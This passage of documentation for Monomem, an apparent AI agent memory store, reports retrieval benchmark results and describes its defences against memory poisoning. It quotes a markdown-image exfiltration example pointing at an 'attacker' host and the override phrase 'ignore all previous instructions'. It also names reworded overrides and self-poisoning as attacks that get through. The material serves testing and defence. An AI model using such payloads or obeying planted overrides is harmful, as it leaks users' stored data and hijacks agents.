equal scores go to the newest note, two-letter words are matched exactly, and request words ("remind", "tell", "find" ...) are
stop words. Recall@5 / recall@10, search time p50:

| Run | Keyword | Hybrid (`nomic-embed-text`, local Ollama) |
|---|---|---|
| LongMemEval-S session (470) | 96.6 / 98.3, 2.8 ms | 98.5 / 99.4, 22 ms |
| LoCoMo-10 session (1,982) | 90.3 / 95.5, 1.0 ms | 91.8 / 96.7, 13 ms |
| LoCoMo-10 turn (1,982) | 57.8 / 65.0, 1.1 ms | 66.3 / 74.9, 22 ms |

The same code with equal column weights (1, 1, 1) gave the same LongMemEval-S and LoCoMo session figures and 58.1 / 65.6 by
turn, so the column weights cost about 0.3 to 0.6 points by turn on LoCoMo; the rest of the change from 2026-11-04 (97.0 / 98.3,
90.2 / 95.6, 58.2 / 65.8) comes from other changes since then (this round's keyword changes or earlier rounds; not measured
separately). An earlier by-turn keyword run of nearly the same code gave 57.7 / 65.2: ties go to the
newest note, and notes written in the same millisecond tie on time, so expect about 0.1 to 0.2 points of run-to-run movement.
The older tables below are kept as they were measured.

### Results, 2026-10-31

Machine: Windows 11 Home, RTX 5080 PC, Node v24.18.0, Monomem 2.0.0. Embeddings for `hybrid`: `nomic-embed-text`
through a local Ollama (`MONOMEM_EMBEDDINGS=on`, `MONOMEM_EMBED_URL=http://127.0.0.1:11499/v1/embeddings`).
Commands exactly as above. Wall time with embeddings: LongMemEval session 15 min (embedding every session is the cost),
LoCoMo a few minutes; keyword-only runs take seconds.

**Search ranking change, 2026-11-04.** The any-keyword step (the fallback behind `state_search`, and all of
`state_relevant`) used to run one FTS query per keyword and fuse the lists with RRF, so a common word ("weekend")
counted as much as a rare one ("giraffe"). It now runs one BM25 `OR` query, where rare words weigh more, and scales
each score by the share of the question's keywords the note contains. Old and new code were run back to back on the
same PC (Node v24.18.0) with the same commands:

| Dataset / search | R@5 | R@10 | Rall@10 | nDCG@10 | MRR | search p50 |
|---|---|---|---|---|---|---|
| LongMemEval-S session, keyword, before | 94.9–95.1 | 97.7 | 88.5 | 86.6 | 87.2 | 2.7 ms |
| LongMemEval-S session, keyword, **now** | **96.8** | **98.1** | **90.0** | **89.5** | **90.7** | **2.4 ms** |
| LongMemEval-S session, relevant, before | 95.1–95.3 | 97.9 | 88.7 | 86.7 | 87.2–87.3 | 1.5 ms |
| LongMemEval-S session, relevant, **now** | **97.0** | **98.3** | **90.2** | **89.7** | **90.8** | 1.9 ms |
| LoCoMo-10 turn, keyword, before | 45.3 | 51.8 | 45.7 | 38.0 | 37.2 | 1.8 ms |
| LoCoMo-10 turn, keyword, **now** | **57.4** | **65.3** | **56.4** | **47.6** | **46.1** | **1.2 ms** |
| LoCoMo-10 turn, relevant, before | 46.4 | 53.0 | 46.4 | 38.9 | 38.0 | 1.9 ms |
| LoCoMo-10 turn, relevant, **now** | **57.6** | **65.4** | **56.6** | **47.7** | **46.2** | **1.3 ms** |
| LoCoMo-10 session, keyword, before | 89.2 | 94.9 | 86.4 | 77.2 | 75.0 | 1.4 ms |
| LoCoMo-10 session, keyword, **now** | **89.5** | 94.8 | **86.5** | **79.2** | **77.5** | **1.1 ms** |
| LoCoMo-10 session, relevant, before | 89.3 | 94.9 | 86.5 | 77.2 | 74.9 | 1.0 ms |
| LoCoMo-10 session, relevant, **now** | **89.6** | 94.8 | 86.5 | **79.4** | **77.8** | **0.8 ms** |

Every quality number went up or stayed level except LoCoMo session R@10 (94.9 to 94.8, one question of 1,982).
Search times are the mean p50 of two interleaved runs of each version (old, new, old, new). Two speed changes ship
with the ranking change: the keyword-coverage check is plain `indexOf` scans, and the FTS index gains FTS5's
1-character prefix index (`prefix='1'`, about 8 % more index size; a store made without it is rebuilt once on open, and
older builds read it unchanged). Keyword search is now faster on all three runs; `state_relevant` is faster on LoCoMo
and about 0.4 ms slower on LongMemEval's long sessions (it now reads its candidate notes for the coverage check). The
old code scored LongMemEval-S keyword R@5 95.1 in one run and 94.9 in two others on the same day; ranking includes an
age penalty measured against the current clock, so ties can move. Latency on this PC moves by a millisecond or more
between runs with other programs open, so compare speeds only within one back-to-back run. With no embedding model,
keyword search now equals the old hybrid row on LongMemEval-S R@5 (96.8) and beats it on LoCoMo turns (R@10 65.3
vs 64.1). Hybrid itself was re-measured after its own change; see the next section.

**Hybrid ranking change, 2026-11-04.** Hybrid used Reciprocal Rank Fusion with equal weights, which looks only at
ranks: a confident keyword winner and a near-random semantic list counted the same, and on LoCoMo whole sessions hybrid
was worse than keywords alone. It now scales each side's scores to 0..1 within the search and adds them 0.5 / 0.5
(`blendHybrid` in `src/search-service.ts`; the idea is from Bruch et al. 2022, arXiv:2210.11934). Choosing the method
and weight: fusion methods (RRF with keyword weights 1 to 4, score blends with keyword weight 0.3 to 0.9, and a
keyword-confidence gate) were compared offline on cached `nomic-embed-text` vectors, tuning on every other question and
checking on the rest. The 0.5 blend was best or within 0.5 points of best on the tuning half of all three runs:

| Held-out half, R@5 / R@10 / nDCG@10 | keyword | RRF (old hybrid) | blend 0.5 (new hybrid) |
|---|---|---|---|
| LongMemEval-S session (235 questions) | 97.4 / 98.7 / 89.2 | 96.6 / 98.7 / 90.9 | **98.3** / 98.7 / **92.3** |
| LoCoMo-10 session (991) | 90.8 / 95.5 / 80.5 | 87.0 / 95.2 / 74.1 | **91.8** / **96.4** / **80.9** |
| LoCoMo-10 turn (991) | 57.9 / 65.7 / 47.5 | 59.4 / 68.6 / 47.1 | **66.4** / **75.5** / **53.0** |

Full end-to-end runs of `--mode hybrid` (live embeddings through Ollama on the RTX 5080, all questions):

| Dataset / search | R@5 | R@10 | Rall@10 | nDCG@10 | MRR | search p50 |
|---|---|---|---|---|---|---|
| LoCoMo-10 session, keyword | 89.5 | 94.8 | 86.5 | 79.2 | 77.5 | 1.4 ms |
| LoCoMo-10 session, hybrid | **91.3** | **96.2** | **89.0** | **80.1** | **77.8** | 18 ms |
| LoCoMo-10 turn, keyword | 57.6 | 65.1 | 56.3 | 47.6 | 46.1 | 1.7 ms |
| LoCoMo-10 turn, hybrid | **65.7** | **74.8** | **64.6** | **52.7** | **50.0** | 31 ms |

| LongMemEval-S session, keyword | 96.8 | 98.1 | 90.0 | 89.5 | 90.7 | 2.8 ms |
| LongMemEval-S session, hybrid | **98.1** | **99.1** | **95.1** | **92.7** | **93.0** | 39 ms |

On LongMemEval-S hybrid lifts preference questions most (R@5 86.7 to 93.3, nDCG@10 65.4 to 74.0) and multi-session
Rall@10 (80.2 to 92.6). Hybrid search time is mostly the embedding call for the query. These hybrid runs predate the
two keyword changes below (date hint, one-keyword questions), which add a little on top of the keyword side.

**Date phrases and one-keyword questions, 2026-11-04 (later the same day).** (1) A date phrase inside the search
("in June", "last week", "on May 3, 2023"; the existing `parseTimePhrase`) now softly boosts notes written in that
window or up to 7 days after it (x2, `TIME_HINT_BOOST`); nothing is dropped, and an explicit time range still filters.
The benchmark resolves the phrase against the question's own date (LongMemEval `question_date`; LoCoMo: the last session
date). About 7 % of LoCoMo questions and 10 of LongMemEval-S's 127 temporal questions contain such a phrase; most
LongMemEval-S temporal questions ask "how many days ago", where the date is the answer, so it barely moves there.
(2) A question with one keyword after stop words ("where is the deploy?") returned nothing: the all-words search needs
"where" and "is" too, and the any-keyword step only ran for two or more keywords. It now runs for one.

| Keyword search | R@5 | R@10 | Rall@10 | nDCG@10 | MRR |
|---|---|---|---|---|---|
| LongMemEval-S, before / after | 96.8 / **97.0** | 98.1 / **98.3** | 90.0 / **90.2** | 89.5 / **89.8** | 90.7 / **91.0** |
| LoCoMo-10 session, before / after | 89.5 / **90.2** | 94.8 / **95.6** | 86.5 / **87.5** | 79.2 / **80.3** | 77.5 / **78.6** |
| LoCoMo-10 turn, before / after | 57.4 / **58.2** | 65.3 / **65.8** | 56.5 / **56.9** | 47.6 / **48.4** | 46.1 / **47.0** |

The boost size and slack were swept (1.2 to 3 x, 0 to 30 days): every setting helped LoCoMo a little and none changed
LongMemEval-S; 2 x / 7 days was best or tied.

**Read these as tuned numbers.** The 2026-11-04 choices (keyword coverage weight, hybrid blend weight, date boost) were made
by looking at these same two datasets, so the figures above are not clean held-out results. The "held-out half" table
splits questions, and LoCoMo's halves share the same 10 conversations. A stricter check, choosing on LoCoMo conversations
1-5 and testing on 6-10, gives the same choice: hybrid R@5 on conversations 6-10 is 65.3 (blend 0.5) vs 59.1 (old RRF) vs
56.9 (keyword) by turn, and 90.8 vs 85.1 vs 89.0 by session. A dataset we have not looked at would be the real test; none
has been run yet. Differences under about 1.5 points on LoCoMo turn R@5 are within noise.

**`memory_index` and session neighbours, 2026-11-04.** `memory_index`, the search over captured observations, still used
the all-words search, so a question found nothing. It now uses `keywordWithFallback` plus a session-neighbour boost: a
captured row gains half the score of a hit written just before or after it in the same capture session
(`SESSION_NEIGHBOUR_WEIGHT`, swept 0.1 to 1.0 offline; chosen on LoCoMo conversations 1-5). Measured through
`memoryIndex()` itself, with every LoCoMo-10 turn stored as a captured observation in its session:

| memory_index, LoCoMo-10 turns | conversations 1-5 R@5 / R@10 / nDCG@10 | conversations 6-10 (not used to choose) | p50 |
|---|---|---|---|
| before (all words) | 0.0 / 0.0 / 0.0 | 0.2 / 0.2 / 0.1 | 0.2 ms |
| + any-keyword search | 59.7 / 66.3 / 48.7 | 56.9 / 65.2 / 47.0 | 1.0 ms |
| + session neighbours | **65.1 / 70.8 / 51.2** | **61.7 / 68.4 / 49.6** | 1.6 ms |

Offline, the same neighbour boost on top of hybrid gave 70.3 R@5 on conversations 6-10 (hybrid alone 65.3). It only applies
to captured rows (observations, summaries): ordinary notes have no session, so `state_search` results are unchanged.
Caveat: LoCoMo turns are a chat between two people; captured coding-session rows may benefit less or more, unmeasured.

**Measured and not shipped: nomic-embed-text task prefixes** (`search_query:` / `search_document:`). Offline, same vectors:
hybrid R@5 on LoCoMo turns 66.4 to 68.2 (held-out half), LoCoMo sessions 91.8 to 91.5, LongMemEval-S 98.3 to 98.3 with R@10
98.7 to 98.3 and nDCG@10 92.3 to 91.8. Mixed results, and every existing user would have to re-embed, so not adopted. Known gap: "before today" reads as "today" (the parser has no
before/after), so such a query boosts the wrong window; the boost reorders and never hides a note.
The rows below headed 2026-10-31 are the old RRF hybrid.

Per question type, LongMemEval-S, `relevant`, now:

| Type | n | R@5 | R@10 | Rall@10 | nDCG@10 |
|---|---|---|---|---|---|
| knowledge-update | 72 | 100.0 | 100.0 | 98.6 | 98.4 |
| multi-session | 121 | 98.3 | 98.3 | 80.2 | 87.2 |
| single-session-assistant | 56 | 100.0 | 100.0 | 100.0 | 99.3 |
| single-session-preference | 30 | 86.7 | 90.0 | 90.0 | 65.4 |
| single-session-user | 64 | 96.9 | 100.0 | 100.0 | 96.4 |
| temporal-reasoning | 127 | 95.3 | 97.6 | 85.8 | 85.3 |

### Results before the ranking change, 2026-10-31

**LongMemEval-S (cleaned), 470 questions, session granularity** (22,419 notes)

| Search | R@5 | R@10 | Rall@10 | nDCG@10 | MRR | search p50 / p95 |
|---|---|---|---|---|---|---|
| keyword (`state_search`) | 95.1 | 97.2 | 88.3 | 87.0 | 87.9 | 2.7 / 5.3 ms |
| relevant (`state_relevant`) | 95.3 | 97.4 | 88.5 | 87.1 | 88.0 | 1.4 / 3.0 ms |
| hybrid (BM25 + embeddings) | **96.8** | **98.5** | **93.0** | **90.4** | **91.4** | 21 / 30 ms |

Before the 2.0.0 fallback, `state_search` needed every word of the question and scored R@5 11.9 here.

Per question type, `relevant`:

| Type | n | R@5 | R@10 | Rall@10 | nDCG@10 |
|---|---|---|---|---|---|
| knowledge-update | 72 | 100.0 | 100.0 | 98.6 | 96.6 |
| multi-session | 121 | 97.5 | 98.3 | 77.7 | 85.6 |
| single-session-assistant | 56 | 100.0 | 100.0 | 100.0 | 96.3 |
| single-session-preference | 30 | 70.0 | 83.3 | 83.3 | 51.4 |
| single-session-user | 64 | 98.4 | 100.0 | 100.0 | 95.2 |
| temporal-reasoning | 127 | 92.9 | 96.1 | 83.5 | 83.4 |

**LongMemEval-S, turn granularity** (231,606 notes, keyword-only run): relevant R@5 95.3, R@10 97.7, Rall@10 87.9,
nDCG@10 87.5, MRR 88.6, search p50 1.7 ms.

**LoCoMo-10, 1,982 questions** (categories as numbered in the file; usually read as 1 multi-hop, 2 temporal,
3 open-domain, 4 single-hop, 5 adversarial)

| Granularity / search | R@5 | R@10 | Rall@10 | nDCG@10 | MRR | search p50 |
|---|---|---|---|---|---|---|
| session, keyword (`state_search`) | 89.1 | 95.0 | 86.4 | 77.3 | 75.0 | 1.3 ms |
| session, relevant | 89.1 | 95.0 | 86.5 | 77.2 | 74.9 | 1.0 ms |
| session, hybrid | 80.0 | 93.0 | 85.2 | 64.0 | 58.1 | 13 ms |
| turn (dialog id), keyword | 44.8 | 52.3 | 46.0 | 38.1 | 37.2 | 2.1 ms |
| turn (dialog id), relevant | 46.1 | 52.8 | 46.2 | 38.8 | 37.9 | 2.1 ms |
| turn (dialog id), hybrid | **52.1** | **64.1** | **54.8** | 38.9 | 35.1 | 27 ms |

### How to read these numbers

- **Natural-language questions to `state_search` used to fail.** Before 2.0.0 it needed every word ("what", "did",
  "I", ...) in one note and found the right session 12 % of the time on LongMemEval-S. The any-word fallback fixed it
  (95 %); full matches still rank first, so short exact queries behave as before.
- **Hybrid (2026-10-31 rows) was not always better.** On LoCoMo whole sessions the old RRF hybrid ranked worse than
  keywords alone (R@5 89 to 80). The 2026-11-04 score blend fixed that (91.3 vs 89.5, above); it is better than keyword
  search on every dataset measured, at about 15 to 30 ms per search for the query embedding. Embeddings are off by
  default, so the default path is the keyword row.
- **LongMemEval-S is easy for retrieval.** Each haystack has about 50 sessions, most of them filler from
  unrelated chat datasets, so the evidence session is often the only one on its topic. High recall here does
  not mean high recall on a real single-topic memory. LoCoMo at turn level, where every turn is from the same
  two people, is the harder test (65.3 % R@10 now, 51.8 % before 2026-11-04).
- **Published retrieval reference.** The LongMemEval paper (Wu et al., 2024, [arXiv:2410.10813](https://arxiv.org/abs/2410.10813),
  Appendix E.2, Table 9) reports flat BM25 with key = value at **session R@5 0.634 / R@10 0.710 (nDCG@10 0.540)**
  and **round (turn) R@5 0.472 / R@10 0.538**; Stella V5 1.5B (dense) reaches session R@5 0.720 / R@10 0.794.
  Its retrieval experiments use the larger **LongMemEval-M** setting (about 500 sessions per haystack) and index
  only the user side of each session, so they are **not directly comparable** with the -S numbers above.
  Running Monomem on -M is the comparable experiment and has not been done yet.
- **End-to-end QA accuracy is a different metric.** Memory vendors usually publish LongMemEval or LoCoMo
  "accuracy" (an LLM answers from retrieved context and another LLM grades it). Those numbers depend on the
  answering model, the prompt and the judge, and **cannot be compared** with the retrieval recall here, in
  either direction.
- One run per configuration. Search is deterministic; latencies vary by a few tenths of a millisecond between
  runs. A few LoCoMo evidence entries hold several ids in one string (`"D8:6; D9:17"`) and are split; entries
  that are not of the form `D<n>:<n>` are dropped.

## Known gaps history

Version numbers below are from before the 2026 rename to Monomem (the product was released as OneMemory 1.x-2.x).

**The five provenance fields, honestly.** Against the usual list (source, timestamp, confidence, tenant, deletion policy), at 1.6.0:
*source*: partly (`written_by` / `created_by` are server-stamped and cannot be faked for token callers (a local stdio app's name is its own config claim); the `source` field is only a claim);
*timestamp*: yes (`created_at`, `updated_at`, kept through export and import, plus a staleness flag); *tenant*: yes (namespaces pinned
to tokens, read grants); *deletion policy*: partly (per-note `forget_after`, archive and sweep, explicit admin delete; no per-tenant default
or legal hold); *confidence*: **yes, as a claim** (an optional 0 to 1 value, labelled with who claimed it, kept through edits, export and import,
and never used to override the trust rules; 1.5.0 dropped it silently).

**Replacing a memory (1.6.0).** Replacing an old note is always two steps, on every surface: a preview that changes nothing and shows
"Are you sure you want to replace this?" with exactly what would stop appearing in search, then a confirm that needs the preview's one-time code.
Nothing is deleted, undo is one command, and every edit now keeps the text it replaces (admin-only history with restore). See
[docs/replacing-memories.md](./replacing-memories.md).

**Known gaps.** Scenarios that fail because Monomem lacks the behaviour are kept, marked, and listed here and in the report. They do not fail the run
(`--strict-gaps` makes them), and a gap that starts to pass fails the run until its marker is removed. The four recorded at 1.5.0 are fixed, and so is the one the memory-poisoning suite found (`GAP-POISON-MDLINK`, 2.0.0), and so is `GAP-OBSOLETE-UNREPLACED` (A33, found and fixed in Monomem 1.5.0). **None is open.**

| Gap | What was missing | Status | Scenarios |
|---|---|---|---|
| `GAP-SUPERSEDE` | No "this replaces that" link: write a second note and leave the first, and search returned both, the old one often first. | **Fixed in 1.6.0**: two-step replace; the old note is kept, hidden, labelled, undoable. | A05, A06, A10, A20, B03 (now pass) |
| `GAP-RECENCY` | A 200-day-old note with better keyword overlap could outrank the current one (flagged, but not second). | **Fixed in 1.6.0**: a stale twin stays behind its newer twin. | A11 (now passes) |
| `GAP-HISTORY` | No version history of bodies; after a bad overwrite the trusted original was not recoverable from Monomem. | **Fixed in 1.6.0**: bounded, admin-only history with restore (restore is a new version). | B08, B09 (now pass) |
| `GAP-REST-CAS` | The REST `PUT /notes/:id` ignored `if_rev`. | **Fixed in 1.5.0**: it takes `if_rev` and answers 409. | B16 (passes) |
| `GAP-CONFIDENCE` | No confidence field; a client could send one but it was dropped silently. | **Fixed in 1.6.0**: optional, validated, labelled as a claim. | D10 (now passes) |
| `GAP-POISON-MDLINK` | The write-time linter did not flag markdown images whose URL smuggles note data out (e.g. `![x](https://attacker/p?data=...)`); such a note was stored as ordinary memory. | **Fixed in 2.0.0**: a remote markdown image with a query string is held in quarantine; README badge hosts are exempt. | E11 (now passes) |
| `GAP-OBSOLETE-UNREPLACED` | A later note updates a fact in different words and nobody replaces the old note: keyword search and the "what is relevant" lookup rank the **old** note first (it matches as well and is shorter). | **Fixed in Monomem 1.5.0**: for the same writer, the same subject and a near tie, the newer note ranks first and the old one is kept right behind it, labelled `restated_by`; never for another writer, over a person-confirmed note, or for outside content. The two-step replace (A34) still removes the old value everywhere. | A33 (now passes); guards A35 to A38 |

**Round 1 retrieval changes, 2026-11-05 (no change in these numbers).** The session-start context now uses one
any-keyword search instead of one per keyword; "how many / total / every / list all" questions return twice the
results with a soft cap of two per capture session or source; MCP search and read results carry a `when` field
("2023-05-08, 5 months ago"). Same commands, keyword mode, same PC, before and after:

| Dataset | R@5 | R@10 | Rall@10 | nDCG@10 | MRR |
|---|---|---|---|---|---|
| LongMemEval-S session, keyword, before / after | 97.0 / 97.0 | 98.3 / 98.3 | 90.2 / 90.2 | 89.8 / 89.8 | 91.0 / 91.0 |
| LoCoMo-10 turn, keyword, before / after | 58.2 / 58.2 | 65.8 / 65.8 | 56.9 / 56.9 | 48.4 / 48.3 | 47.0 / 46.9 |

The benchmark notes carry no capture session or source, so the per-session cap and the date field are not exercised
here; they are covered by unit tests. The session-start change is not a benchmark path either. LoCoMo was also used
to tune the 11-04 session-neighbour weight, so its numbers are not a held-out test. No end-to-end answer accuracy was
re-measured in this round.

## Write-check false positives: how often ordinary text is refused or held

Measured 2026-11-10 on Monomem 1.3.2 with `node bench/lint-fp.mjs` (after `npm run build`, with no `MONOMEM_TOKEN*` set).
It runs `lintContent`, the check every write goes through, over text that contains no attacks planted by us, one note per
chat turn or paragraph. **None of these corpora is real agent notes**, which carry more commands, paths and code; read the
numbers as a floor for chat and a rough guide for technical prose.

| Corpus | Notes | Refused (secret) | Held (injection) | Warned only |
|---|---:|---:|---:|---:|
| LongMemEval-S cleaned, chat turns | 189,502 | 27 (0.014%) | 21 (0.011%) | 421 (0.22%) |
| LoCoMo-10, chat turns | 1,033 | 0 | 0 | 0 |
| Monomem CHANGELOG bullets + docs paragraphs | 1,128 | 4 (0.35%) | 5 (0.44%) | 8 (0.71%) |

Every refused and held note was read by hand (`--show-held` prints them):

- **Held, LongMemEval (21):** 17 are user messages that really say "ignore all previous instructions" (prompt templates
  pasted into a chatbot), 2 contain leftover Llama chat-template tokens (`<|start_header_id|>assistant`) in the dataset,
  1 is a broken flag emoji that left invisible Unicode tag characters behind, and 1 asks for a markdown image whose URL
  carries data. All 21 contain exactly what the rule is for; none is an accidental match. In a memory store they would still
  be held, and approving one is `monomem quarantine`.
- **Held, docs (5):** all 5 quote attacks on purpose (changelog lines describing the check itself, and a migration guide
  that names "Ignore previous instructions" as an example). No accidental match.
- **Refused, LongMemEval (27):** the real noise. Almost all are code or config examples with a sample password in them
  (`DB_PASSWORD=secret`, a `password:` line in a docker-compose file, a database URL with `user:pass@`), plus one private
  key block and one long URL token. The secret guard refuses these on purpose, because a placeholder and a real password
  look the same. If you save code examples as notes, expect about 1 in 7,000 to be refused; the error says what it looks
  like (`"password: ..."`), and replacing the value with `<password>` saves it (checked). An administrator can make this a
  warning instead with `MONOMEM_LINT=secrets=warn`.
- **Refused, docs (4):** changelog lines that quote password shapes as examples.
- **Warned only** never stops a write: emails, phone numbers, IP addresses and "package install" lines are noted and saved.

Not measured: notes written by real agents over months, and non-English text. The patterns were written with the attacks in
`bench/` in view, so a clean result on these corpora says the check is quiet on ordinary chat and docs, not that it is quiet
on your notes. Run the script on an export of your own store to see your number.

## `monomem drill`: the poisoning attacks on your own setup

`monomem drill` copies your store to a temporary folder (`VACUUM INTO`, your file is opened read-only), replays the
suite-E poisoning scenarios plus one self-poisoning case against the copy through the same adapter `monomem bench`
uses, and deletes the copy. Unlike `bench`, it keeps your environment (`MONOMEM_LINT` and the rest), so the result
reflects your configuration, except embeddings: the drill forces them off and never makes a network call. Each attack is `held`, `warned` (stored, but labelled or warned about) or `REACHED`.
`--json` prints the full result. Exit code 0 when only known misses got through, 1 otherwise, 2 when it could not run.

Two attacks are known misses by design: E16 (a reworded override that no pattern matches; one admin distrust of the
writer removes it afterwards) and self-poisoning (a trusted writer stores an attacker's instruction in its own words).
Both are expected to reach the agent and are reported as such, not as passes.

The same attacks, with their expected outcomes, are exported to `evals/poisoning-corpus.json` (see `evals/README.md`).

## `monomem health`: one grade over the checks you already have

`monomem health [--json] [--card [file.svg]]` prints one line per check, then a grade from A to F: Node and SQLite, the database,
the SessionStart hook, the settings `doctor` warns about, `drill`, the audit chain, held writes, distrusted writers, notes carrying a
`[REDACTED:...]` marker, and the memory size and token savings from `monomem meter`. Your store is only read; `drill` runs on a copy.

Grade rule: start at A. Each warn lowers it one step (A to F). Any fail caps it at D. Unexpected drill reach (an attack other than
the two known misses got through) is F. A to C exits 0, D to F exits 1. Fails are: Node or FTS5 unusable, no openable database, a broken
audit chain, unexpected drill reach. Warns are: no SessionStart hook, any security-settings warning, held writes waiting, drill or audit
log could not run or be read. Distrust rules, redaction markers and size are shown but never lower the grade.

What it does not cover: the injection check is a pattern linter; reworded attacks and self-poisoning still get through. `--card` writes
the result as a shareable SVG (grade, one word per check, date).
